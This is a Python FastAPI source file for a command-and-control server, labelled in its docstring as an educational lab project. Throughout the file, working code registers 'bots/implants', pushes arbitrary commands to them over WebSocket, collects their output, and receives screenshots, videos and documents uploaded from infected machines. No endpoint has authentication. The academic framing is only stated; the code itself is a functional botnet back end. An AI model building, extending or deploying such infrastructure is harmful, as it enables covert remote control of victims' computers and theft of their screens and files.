"""
C2 Server - Educational Cybersecurity Lab Project
For academic research under professor supervision
"""

import os
import json
import uuid
import sqlite3
from datetime import datetime, timedelta
from typing import List, Dict, Any, Optional
from pathlib import Path

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, UploadFile, File, Form, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
import uvicorn

# ============ Database Setup ============
DB_PATH = "data/c2_database.db"

def init_db():
    """Initialize SQLite database with required tables"""
    os.makedirs("data", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Bots table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bots (
            id TEXT PRIMARY KEY,
            name TEXT,
            os TEXT,
            username TEXT,
            hostname TEXT,
            ip_address TEXT,
            last_seen TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_online BOOLEAN DEFAULT 0,
            tags TEXT DEFAULT '[]'
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            bot_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',  -- pending, executing, completed, failed
            result TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            FOREIGN KEY (bot_id) REFERENCES bots (id)
        )
    ''')
    
    # Files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id TEXT PRIMARY KEY,
            bot_id TEXT,
            filename TEXT,
            filepath TEXT,
            file_type TEXT,  -- screenshot, video, document, other
            size INTEGER,
            uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (bot_id) REFERENCES bots (id)
        )
    ''')
    
    conn.commit()
    conn.close()

# Initialize database on startup
init_db()

# ============ Pydantic Models ============
class BotRegister(BaseModel):
    name: str
    os: str
    username: str
    hostname: str
    ip_address: str

class CommandRequest(BaseModel):
    command: str
    bot_id: str

class FileUploadRequest(BaseModel):
    bot_id: str
    file_type: str = "screenshot"

# ============ FastAPI App ============
app = FastAPI(title="C2 Server - Educational Lab", 
              description="Command and Control Server for Cybersecurity Research",
              version="1.0.0")

# CORS Middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000", "http://127.0.0.1:3000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Mount uploads directory
os.makedirs("uploads/screenshots", exist_ok=True)
os.makedirs("uploads/videos", exist_ok=True)
os.makedirs("uploads/files", exist_ok=True)
app.mount("/uploads", StaticFiles(directory="uploads"), name="uploads")

# ============ WebSocket Manager ============
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.bot_connections: Dict[str, WebSocket] = {}
    
    async def connect(self, websocket: WebSocket, client_id: str, client_type: str = "dashboard"):
        """Connect a client (dashboard or bot)"""
        await websocket.accept()
        if client_type == "dashboard":
            self.active_connections[client_id] = websocket
        else:
            self.bot_connections[client_id] = websocket
    
    def disconnect(self, client_id: str, client_type: str = "dashboard"):
        """Disconnect a client"""
        if client_type == "dashboard":
            self.active_connections.pop(client_id, None)
        else:
            self.bot_connections.pop(client_id, None)
    
    async def send_to_dashboard(self, message: Dict[str, Any]):
        """Send message to all connected dashboards"""
        for connection in self.active_connections.values():
            try:
                await connection.send_json(message)
            except:
                pass
    
    async def send_to_bot(self, bot_id: str, message: Dict[str, Any]):
        """Send message to specific bot"""
        if bot_id in self.bot_connections:
            try:
                await self.bot_connections[bot_id].send_json(message)
            except:
                pass

manager = ConnectionManager()

# ============ Database Helper Functions ============
def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d

# ============ API Endpoints ============
@app.post("/api/register")
async def register_bot(bot_data: BotRegister):
    """Register a new bot/implant"""
    bot_id = str(uuid.uuid4())
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO bots (id, name, os, username, hostname, ip_address, last_seen, is_online)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (bot_id, bot_data.name, bot_data.os, bot_data.username, 
          bot_data.hostname, bot_data.ip_address, datetime.now(), True))
    
    conn.commit()
    conn.close()
    
    # Notify dashboards
    await manager.send_to_dashboard({
        "type": "bot_registered",
        "bot_id": bot_id,
        "bot_data": {
            "id": bot_id,
            "name": bot_data.name,
            "os": bot_data.os,
            "username": bot_data.username,
            "hostname": bot_data.hostname,
            "ip_address": bot_data.ip_address,
            "is_online": True
        }
    })
    
    return {"bot_id": bot_id, "status": "registered"}

@app.get("/api/bots")
async def get_all_bots():
    """Get all registered bots"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT * FROM bots ORDER BY last_seen DESC
    ''')
    
    bots = cursor.fetchall()
    conn.close()
    
    return {"bots": [dict(bot) for bot in bots]}

@app.get("/api/bot/{bot_id}")
async def get_bot_details(bot_id: str):
    """Get details of specific bot"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM bots WHERE id = ?', (bot_id,))
    bot = cursor.fetchone()
    
    if not bot:
        conn.close()
        raise HTTPException(status_code=404, detail="Bot not found")
    
    # Get bot's recent commands
    cursor.execute('''
        SELECT * FROM commands 
        WHERE bot_id = ? 
        ORDER BY created_at DESC 
        LIMIT 20
    ''', (bot_id,))
    commands = cursor.fetchall()
    
    # Get bot's files
    cursor.execute('''
        SELECT * FROM files 
        WHERE bot_id = ? 
        ORDER BY uploaded_at DESC
    ''', (bot_id,))
    files = cursor.fetchall()
    
    conn.close()
    
    return {
        "bot": dict(bot),
        "recent_commands": [dict(cmd) for cmd in commands],
        "files": [dict(f) for f in files]
    }

@app.post("/api/command")
async def send_command(cmd: CommandRequest):
    """Send command to bot"""
    command_id = str(uuid.uuid4())
    
    # Check if bot exists
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM bots WHERE id = ?', (cmd.bot_id,))
    bot = cursor.fetchone()
    
    if not bot:
        conn.close()
        raise HTTPException(status_code=404, detail="Bot not found")
    
    # Create command record
    cursor.execute('''
        INSERT INTO commands (id, bot_id, command, status)
        VALUES (?, ?, ?, ?)
    ''', (command_id, cmd.bot_id, cmd.command, "pending"))
    
    conn.commit()
    conn.close()
    
    # Notify bot via WebSocket
    await manager.send_to_bot(cmd.bot_id, {
        "type": "command",
        "command_id": command_id,
        "command": cmd.command
    })
    
    # Notify dashboards
    await manager.send_to_dashboard({
        "type": "command_sent",
        "command_id": command_id,
        "bot_id": cmd.bot_id,
        "command": cmd.command
    })
    
    return {"command_id": command_id, "status": "sent"}

@app.post("/api/command/result")
async def command_result(
    command_id: str = Form(...),
    result: str = Form(...),
    status: str = Form("completed")
):
    """Receive command result from bot"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        UPDATE commands 
        SET result = ?, status = ?, completed_at = ?
        WHERE id = ?
    ''', (result, status, datetime.now(), command_id))
    
    # Get bot_id for this command
    cursor.execute('SELECT bot_id FROM commands WHERE id = ?', (command_id,))
    cmd_data = cursor.fetchone()
    
    if cmd_data:
        bot_id = dict(cmd_data)["bot_id"]
        
        # Update bot's last seen
        cursor.execute('''
            UPDATE bots 
            SET last_seen = ?, is_online = ?
            WHERE id = ?
        ''', (datetime.now(), True, bot_id))
        
        conn.commit()
        
        # Notify dashboards
        await manager.send_to_dashboard({
            "type": "command_result",
            "command_id": command_id,
            "bot_id": bot_id,
            "result": result,
            "status": status
        })
    
    conn.close()
    
    return {"status": "result_received"}

@app.post("/api/upload")
async def upload_file(
    file: UploadFile = File(...),
    bot_id: str = Form(...),
    file_type: str = Form("screenshot")
):
    """Upload file from bot"""
    # Validate file type
    if file_type not in ["screenshot", "video", "document", "other"]:
        file_type = "other"
    
    # Create unique filename
    file_id = str(uuid.uuid4())
    file_extension = Path(file.filename).suffix if file.filename else ".bin"
    filename = f"{file_id}{file_extension}"
    
    # Determine upload directory
    if file_type == "screenshot":
        upload_dir = "uploads/screenshots"
    elif file_type == "video":
        upload_dir = "uploads/videos"
    else:
        upload_dir = "uploads/files"
    
    os.makedirs(upload_dir, exist_ok=True)
    filepath = os.path.join(upload_dir, filename)
    
    # Save file
    with open(filepath, "wb") as buffer:
        content = await file.read()
        buffer.write(content)
    
    # Save file record to database
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO files (id, bot_id, filename, filepath, file_type, size)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (file_id, bot_id, file.filename, filepath, file_type, len(content)))
    
    # Update bot's last seen
    cursor.execute('''
        UPDATE bots 
        SET last_seen = ?, is_online = ?
        WHERE id = ?
    ''', (datetime.now(), True, bot_id))
    
    conn.commit()
    conn.close()
    
    # Notify dashboards
    await manager.send_to_dashboard({
        "type": "file_uploaded",
        "file_id": file_id,
        "bot_id": bot_id,
        "filename": file.filename,
        "file_type": file_type,
        "filepath": f"/uploads/{file_type}s/{filename}",
        "size": len(content)
    })
    
    return {
        "file_id": file_id,
        "filename": file.filename,
        "filepath": f"/uploads/{file_type}s/{filename}"
    }

@app.get("/api/files/{bot_id}")
async def get_bot_files(bot_id: str):
    """Get all files for a bot"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT * FROM files 
        WHERE bot_id = ? 
        ORDER BY uploaded_at DESC
    ''', (bot_id,))
    
    files = cursor.fetchall()
    conn.close()
    
    return {"files": [dict(f) for f in files]}

@app.get("/api/commands/{bot_id}")
async def get_bot_commands(bot_id: str, limit: int = 50):
    """Get command history for a bot"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT * FROM commands 
        WHERE bot_id = ? 
        ORDER BY created_at DESC 
        LIMIT ?
    ''', (bot_id, limit))
    
    commands = cursor.fetchall()
    conn.close()
    
    return {"commands": [dict(cmd) for cmd in commands]}

@app.delete("/api/bot/{bot_id}")
async def delete_bot(bot_id: str):
    """Remove bot from system"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Delete bot and associated data
    cursor.execute('DELETE FROM bots WHERE id = ?', (bot_id,))
    cursor.execute('DELETE FROM commands WHERE bot_id = ?', (bot_id,))
    cursor.execute('DELETE FROM files WHERE bot_id = ?', (bot_id,))
    
    conn.commit()
    conn.close()
    
    # Notify dashboards
    await manager.send_to_dashboard({
        "type": "bot_deleted",
        "bot_id": bot_id
    })
    
    return {"status": "deleted"}

@app.get("/api/stats")
async def get_system_stats():
    """Get system statistics"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('SELECT COUNT(*) as total FROM bots')
    total_bots = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) as online FROM bots WHERE is_online = 1')
    online_bots = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) as total FROM commands')
    total_commands = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) as total FROM files')
    total_files = cursor.fetchone()[0]
    
    cursor.execute('SELECT SUM(size) as total_size FROM files')
    total_size = cursor.fetchone()[0] or 0
    
    conn.close()
    
    return {
        "total_bots": total_bots,
        "online_bots": online_bots,
        "total_commands": total_commands,
        "total_files": total_files,
        "total_storage_mb": round(total_size / (1024 * 1024), 2)
    }

# ============ WebSocket Endpoints ============
@app.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket):
    """WebSocket endpoint for dashboard"""
    client_id = str(uuid.uuid4())
    
    await manager.connect(websocket, client_id, "dashboard")
    
    try:
        # Send initial data
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM bots ORDER BY last_seen DESC')
        bots = cursor.fetchall()
        
        await websocket.send_json({
            "type": "init",
            "bots": [dict(bot) for bot in bots]
        })
        
        conn.close()
        
        # Keep connection alive
        while True:
            data = await websocket.receive_json()
            # Handle dashboard messages if needed
            
    except WebSocketDisconnect:
        manager.disconnect(client_id, "dashboard")

@app.websocket("/ws/bot/{bot_id}")
async def websocket_bot(websocket: WebSocket, bot_id: str):
    """WebSocket endpoint for bots"""
    await manager.connect(websocket, bot_id, "bot")
    
    # Update bot as online
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('UPDATE bots SET is_online = 1, last_seen = ? WHERE id = ?', 
                  (datetime.now(), bot_id))
    conn.commit()
    conn.close()
    
    # Notify dashboards
    await manager.send_to_dashboard({
        "type": "bot_online",
        "bot_id": bot_id
    })
    
    try:
        while True:
            data = await websocket.receive_json()
            # Handle bot messages
            
    except WebSocketDisconnect:
        manager.disconnect(bot_id, "bot")
        
        # Update bot as offline
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('UPDATE bots SET is_online = 0 WHERE id = ?', (bot_id,))
        conn.commit()
        conn.close()
        
        # Notify dashboards
        await manager.send_to_dashboard({
            "type": "bot_offline",
            "bot_id": bot_id
        })

# ============ Health Check ============
@app.get("/")
async def root():
    return {
        "message": "C2 Server - Educational Cybersecurity Lab",
        "version": "1.0.0",
        "endpoints": {
            "api_docs": "/docs",
            "dashboard": "http://localhost:3000",
            "websocket_dashboard": "/ws/dashboard",
            "websocket_bot": "/ws/bot/{bot_id}"
        }
    }

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

# ============ Main Execution ============
if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8000,
        reload=True,
        log_level="info"
    )